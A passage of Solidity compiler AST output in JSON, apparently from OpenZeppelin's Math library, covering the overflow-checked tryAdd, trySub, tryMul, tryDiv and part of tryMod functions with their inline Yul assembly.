ype":"VariableDeclaration","scope":2105,"src":"1088:12:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2098,"name":"uint256","nodeType":"ElementaryTypeName","src":"1088:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2101,"mutability":"mutable","name":"low","nameLocation":"1110:3:6","nodeType":"VariableDeclaration","scope":2105,"src":"1102:11:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2100,"name":"uint256","nodeType":"ElementaryTypeName","src":"1102:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1087:27:6"},"scope":3686,"src":"1027:550:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2139,"nodeType":"Block","src":"1784:149:6","statements":[{"id":2138,"nodeType":"UncheckedBlock","src":"1794:133:6","statements":[{"assignments":[2118],"declarations":[{"constant":false,"id":2118,"mutability":"mutable","name":"c","nameLocation":"1826:1:6","nodeType":"VariableDeclaration","scope":2138,"src":"1818:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2117,"name":"uint256","nodeType":"ElementaryTypeName","src":"1818:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2122,"initialValue":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2121,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2119,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2108,"src":"1830:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"+","rightExpression":{"id":2120,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2110,"src":"1834:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"1830:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"1818:17:6"},{"expression":{"id":2127,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2123,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2113,"src":"1849:7:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2126,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2124,"name":"c","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2118,"src":"1859:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">=","rightExpression":{"id":2125,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2108,"src":"1864:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"1859:6:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"1849:16:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2128,"nodeType":"ExpressionStatement","src":"1849:16:6"},{"expression":{"id":2136,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2129,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2115,"src":"1879:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2135,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2130,"name":"c","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2118,"src":"1888:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"arguments":[{"id":2133,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2113,"src":"1908:7:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":2131,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"1892:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":2132,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"1901:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"1892:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":2134,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"1892:24:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"1888:28:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"1879:37:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2137,"nodeType":"ExpressionStatement","src":"1879:37:6"}]}]},"documentation":{"id":2106,"nodeType":"StructuredDocumentation","src":"1583:105:6","text":" @dev Returns the addition of two unsigned integers, with a success flag (no overflow)."},"id":2140,"implemented":true,"kind":"function","modifiers":[],"name":"tryAdd","nameLocation":"1702:6:6","nodeType":"FunctionDefinition","parameters":{"id":2111,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2108,"mutability":"mutable","name":"a","nameLocation":"1717:1:6","nodeType":"VariableDeclaration","scope":2140,"src":"1709:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2107,"name":"uint256","nodeType":"ElementaryTypeName","src":"1709:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2110,"mutability":"mutable","name":"b","nameLocation":"1728:1:6","nodeType":"VariableDeclaration","scope":2140,"src":"1720:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2109,"name":"uint256","nodeType":"ElementaryTypeName","src":"1720:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1708:22:6"},"returnParameters":{"id":2116,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2113,"mutability":"mutable","name":"success","nameLocation":"1759:7:6","nodeType":"VariableDeclaration","scope":2140,"src":"1754:12:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":2112,"name":"bool","nodeType":"ElementaryTypeName","src":"1754:4:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":2115,"mutability":"mutable","name":"result","nameLocation":"1776:6:6","nodeType":"VariableDeclaration","scope":2140,"src":"1768:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2114,"name":"uint256","nodeType":"ElementaryTypeName","src":"1768:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1753:30:6"},"scope":3686,"src":"1693:240:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2174,"nodeType":"Block","src":"2143:149:6","statements":[{"id":2173,"nodeType":"UncheckedBlock","src":"2153:133:6","statements":[{"assignments":[2153],"declarations":[{"constant":false,"id":2153,"mutability":"mutable","name":"c","nameLocation":"2185:1:6","nodeType":"VariableDeclaration","scope":2173,"src":"2177:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2152,"name":"uint256","nodeType":"ElementaryTypeName","src":"2177:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2157,"initialValue":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2156,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2154,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2143,"src":"2189:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"-","rightExpression":{"id":2155,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2145,"src":"2193:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2189:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"2177:17:6"},{"expression":{"id":2162,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2158,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2148,"src":"2208:7:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2161,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2159,"name":"c","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2153,"src":"2218:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"<=","rightExpression":{"id":2160,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2143,"src":"2223:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2218:6:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"2208:16:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2163,"nodeType":"ExpressionStatement","src":"2208:16:6"},{"expression":{"id":2171,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2164,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2150,"src":"2238:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2170,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2165,"name":"c","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2153,"src":"2247:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"arguments":[{"id":2168,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2148,"src":"2267:7:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":2166,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"2251:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":2167,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"2260:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"2251:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":2169,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2251:24:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2247:28:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2238:37:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2172,"nodeType":"ExpressionStatement","src":"2238:37:6"}]}]},"documentation":{"id":2141,"nodeType":"StructuredDocumentation","src":"1939:108:6","text":" @dev Returns the subtraction of two unsigned integers, with a success flag (no overflow)."},"id":2175,"implemented":true,"kind":"function","modifiers":[],"name":"trySub","nameLocation":"2061:6:6","nodeType":"FunctionDefinition","parameters":{"id":2146,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2143,"mutability":"mutable","name":"a","nameLocation":"2076:1:6","nodeType":"VariableDeclaration","scope":2175,"src":"2068:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2142,"name":"uint256","nodeType":"ElementaryTypeName","src":"2068:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2145,"mutability":"mutable","name":"b","nameLocation":"2087:1:6","nodeType":"VariableDeclaration","scope":2175,"src":"2079:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2144,"name":"uint256","nodeType":"ElementaryTypeName","src":"2079:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2067:22:6"},"returnParameters":{"id":2151,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2148,"mutability":"mutable","name":"success","nameLocation":"2118:7:6","nodeType":"VariableDeclaration","scope":2175,"src":"2113:12:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":2147,"name":"bool","nodeType":"ElementaryTypeName","src":"2113:4:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":2150,"mutability":"mutable","name":"result","nameLocation":"2135:6:6","nodeType":"VariableDeclaration","scope":2175,"src":"2127:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2149,"name":"uint256","nodeType":"ElementaryTypeName","src":"2127:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2112:30:6"},"scope":3686,"src":"2052:240:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2204,"nodeType":"Block","src":"2505:391:6","statements":[{"id":2203,"nodeType":"UncheckedBlock","src":"2515:375:6","statements":[{"assignments":[2188],"declarations":[{"constant":false,"id":2188,"mutability":"mutable","name":"c","nameLocation":"2547:1:6","nodeType":"VariableDeclaration","scope":2203,"src":"2539:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2187,"name":"uint256","nodeType":"ElementaryTypeName","src":"2539:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"id":2192,"initialValue":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2191,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2189,"name":"a","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2178,"src":"2551:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"id":2190,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2180,"src":"2555:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2551:5:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"VariableDeclarationStatement","src":"2539:17:6"},{"AST":{"nativeSrc":"2595:188:6","nodeType":"YulBlock","src":"2595:188:6","statements":[{"nativeSrc":"2727:42:6","nodeType":"YulAssignment","src":"2727:42:6","value":{"arguments":[{"arguments":[{"arguments":[{"name":"c","nativeSrc":"2748:1:6","nodeType":"YulIdentifier","src":"2748:1:6"},{"name":"a","nativeSrc":"2751:1:6","nodeType":"YulIdentifier","src":"2751:1:6"}],"functionName":{"name":"div","nativeSrc":"2744:3:6","nodeType":"YulIdentifier","src":"2744:3:6"},"nativeSrc":"2744:9:6","nodeType":"YulFunctionCall","src":"2744:9:6"},{"name":"b","nativeSrc":"2755:1:6","nodeType":"YulIdentifier","src":"2755:1:6"}],"functionName":{"name":"eq","nativeSrc":"2741:2:6","nodeType":"YulIdentifier","src":"2741:2:6"},"nativeSrc":"2741:16:6","nodeType":"YulFunctionCall","src":"2741:16:6"},{"arguments":[{"name":"a","nativeSrc":"2766:1:6","nodeType":"YulIdentifier","src":"2766:1:6"}],"functionName":{"name":"iszero","nativeSrc":"2759:6:6","nodeType":"YulIdentifier","src":"2759:6:6"},"nativeSrc":"2759:9:6","nodeType":"YulFunctionCall","src":"2759:9:6"}],"functionName":{"name":"or","nativeSrc":"2738:2:6","nodeType":"YulIdentifier","src":"2738:2:6"},"nativeSrc":"2738:31:6","nodeType":"YulFunctionCall","src":"2738:31:6"},"variableNames":[{"name":"success","nativeSrc":"2727:7:6","nodeType":"YulIdentifier","src":"2727:7:6"}]}]},"evmVersion":"paris","externalReferences":[{"declaration":2178,"isOffset":false,"isSlot":false,"src":"2751:1:6","valueSize":1},{"declaration":2178,"isOffset":false,"isSlot":false,"src":"2766:1:6","valueSize":1},{"declaration":2180,"isOffset":false,"isSlot":false,"src":"2755:1:6","valueSize":1},{"declaration":2188,"isOffset":false,"isSlot":false,"src":"2748:1:6","valueSize":1},{"declaration":2183,"isOffset":false,"isSlot":false,"src":"2727:7:6","valueSize":1}],"flags":["memory-safe"],"id":2193,"nodeType":"InlineAssembly","src":"2570:213:6"},{"expression":{"id":2201,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2194,"name":"result","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2185,"src":"2842:6:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2200,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2195,"name":"c","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2188,"src":"2851:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":"*","rightExpression":{"arguments":[{"id":2198,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2183,"src":"2871:7:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_bool","typeString":"bool"}],"expression":{"id":2196,"name":"SafeCast","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":5451,"src":"2855:8:6","typeDescriptions":{"typeIdentifier":"t_type$_t_contract$_SafeCast_$5451_$","typeString":"type(library SafeCast)"}},"id":2197,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"memberLocation":"2864:6:6","memberName":"toUint","nodeType":"MemberAccess","referencedDeclaration":5450,"src":"2855:15:6","typeDescriptions":{"typeIdentifier":"t_function_internal_pure$_t_bool_$returns$_t_uint256_$","typeString":"function (bool) pure returns (uint256)"}},"id":2199,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"2855:24:6","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2851:28:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"2842:37:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":2202,"nodeType":"ExpressionStatement","src":"2842:37:6"}]}]},"documentation":{"id":2176,"nodeType":"StructuredDocumentation","src":"2298:111:6","text":" @dev Returns the multiplication of two unsigned integers, with a success flag (no overflow)."},"id":2205,"implemented":true,"kind":"function","modifiers":[],"name":"tryMul","nameLocation":"2423:6:6","nodeType":"FunctionDefinition","parameters":{"id":2181,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2178,"mutability":"mutable","name":"a","nameLocation":"2438:1:6","nodeType":"VariableDeclaration","scope":2205,"src":"2430:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2177,"name":"uint256","nodeType":"ElementaryTypeName","src":"2430:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2180,"mutability":"mutable","name":"b","nameLocation":"2449:1:6","nodeType":"VariableDeclaration","scope":2205,"src":"2441:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2179,"name":"uint256","nodeType":"ElementaryTypeName","src":"2441:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2429:22:6"},"returnParameters":{"id":2186,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2183,"mutability":"mutable","name":"success","nameLocation":"2480:7:6","nodeType":"VariableDeclaration","scope":2205,"src":"2475:12:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":2182,"name":"bool","nodeType":"ElementaryTypeName","src":"2475:4:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":2185,"mutability":"mutable","name":"result","nameLocation":"2497:6:6","nodeType":"VariableDeclaration","scope":2205,"src":"2489:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2184,"name":"uint256","nodeType":"ElementaryTypeName","src":"2489:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2474:30:6"},"scope":3686,"src":"2414:482:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2225,"nodeType":"Block","src":"3111:231:6","statements":[{"id":2224,"nodeType":"UncheckedBlock","src":"3121:215:6","statements":[{"expression":{"id":2221,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2217,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2213,"src":"3145:7:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2220,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2218,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2210,"src":"3155:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2219,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"3159:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"3155:5:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"3145:15:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2222,"nodeType":"ExpressionStatement","src":"3145:15:6"},{"AST":{"nativeSrc":"3199:127:6","nodeType":"YulBlock","src":"3199:127:6","statements":[{"nativeSrc":"3293:19:6","nodeType":"YulAssignment","src":"3293:19:6","value":{"arguments":[{"name":"a","nativeSrc":"3307:1:6","nodeType":"YulIdentifier","src":"3307:1:6"},{"name":"b","nativeSrc":"3310:1:6","nodeType":"YulIdentifier","src":"3310:1:6"}],"functionName":{"name":"div","nativeSrc":"3303:3:6","nodeType":"YulIdentifier","src":"3303:3:6"},"nativeSrc":"3303:9:6","nodeType":"YulFunctionCall","src":"3303:9:6"},"variableNames":[{"name":"result","nativeSrc":"3293:6:6","nodeType":"YulIdentifier","src":"3293:6:6"}]}]},"evmVersion":"paris","externalReferences":[{"declaration":2208,"isOffset":false,"isSlot":false,"src":"3307:1:6","valueSize":1},{"declaration":2210,"isOffset":false,"isSlot":false,"src":"3310:1:6","valueSize":1},{"declaration":2215,"isOffset":false,"isSlot":false,"src":"3293:6:6","valueSize":1}],"flags":["memory-safe"],"id":2223,"nodeType":"InlineAssembly","src":"3174:152:6"}]}]},"documentation":{"id":2206,"nodeType":"StructuredDocumentation","src":"2902:113:6","text":" @dev Returns the division of two unsigned integers, with a success flag (no division by zero)."},"id":2226,"implemented":true,"kind":"function","modifiers":[],"name":"tryDiv","nameLocation":"3029:6:6","nodeType":"FunctionDefinition","parameters":{"id":2211,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2208,"mutability":"mutable","name":"a","nameLocation":"3044:1:6","nodeType":"VariableDeclaration","scope":2226,"src":"3036:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2207,"name":"uint256","nodeType":"ElementaryTypeName","src":"3036:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":2210,"mutability":"mutable","name":"b","nameLocation":"3055:1:6","nodeType":"VariableDeclaration","scope":2226,"src":"3047:9:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2209,"name":"uint256","nodeType":"ElementaryTypeName","src":"3047:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3035:22:6"},"returnParameters":{"id":2216,"nodeType":"ParameterList","parameters":[{"constant":false,"id":2213,"mutability":"mutable","name":"success","nameLocation":"3086:7:6","nodeType":"VariableDeclaration","scope":2226,"src":"3081:12:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"typeName":{"id":2212,"name":"bool","nodeType":"ElementaryTypeName","src":"3081:4:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"visibility":"internal"},{"constant":false,"id":2215,"mutability":"mutable","name":"result","nameLocation":"3103:6:6","nodeType":"VariableDeclaration","scope":2226,"src":"3095:14:6","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":2214,"name":"uint256","nodeType":"ElementaryTypeName","src":"3095:7:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3080:30:6"},"scope":3686,"src":"3020:322:6","stateMutability":"pure","virtual":false,"visibility":"internal"},{"body":{"id":2246,"nodeType":"Block","src":"3567:231:6","statements":[{"id":2245,"nodeType":"UncheckedBlock","src":"3577:215:6","statements":[{"expression":{"id":2242,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"id":2238,"name":"success","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2234,"src":"3601:7:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"commonType":{"typeIdentifier":"t_uint256","typeString":"uint256"},"id":2241,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":2239,"name":"b","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":2231,"src":"3611:1:6","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"BinaryOperation","operator":">","rightExpression":{"hexValue":"30","id":2240,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"3615:1:6","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"},"src":"3611:5:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"src":"3601:15:6","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":2243,"nodeType":"ExpressionStatement","src":"3601:15:6"},{"AST":{"nativeSrc":"3655:127:6","nodeType":"YulBlock","src":"3655:127:6","statements":[{"nativeSrc":"3749:19:6","nodeType":"YulAssignment","src":"3749:19:6","value":{"arguments":[{"name":"a","nativeSrc":"3763:1:6","nodeType":"YulIdentifier","src":"3763:1:6"},{"name":"b","nativeSrc":"3766:1:6","nodeType":"YulIdentifier","src":"3766:1:6"}],"functionName":{"name":"mod","nativeSrc":"3759:3:6","nodeType":"YulIdentifier","src":"3759:3:6"},"nativeSrc":"3759:9:6","nodeType":"YulFunctionCall","src":"3759:9:6"},"variableNames":[{"name":"result","nativeSrc":"3749:6:6","nodeType":"YulIdentifier","src":"3749:6:6"}]}]},"evmVersion":"paris","externalReferences":[{"declaration":2229,"isOffset":false,"isSlot":false,"src":"3763:1:6","valueSize":1},{"declaration":2231,"isOffset":false,"isSlot":false,"src":"3766:1:6","valueSize":1},{"declaration":2236,"isOffset":false,"isSlot":false,"src":"3749:6:6","valueSize":1}],"flags":["memory-safe"],"id":2244,"nodeType":"InlineAssembly","src":"3630:152:6"}]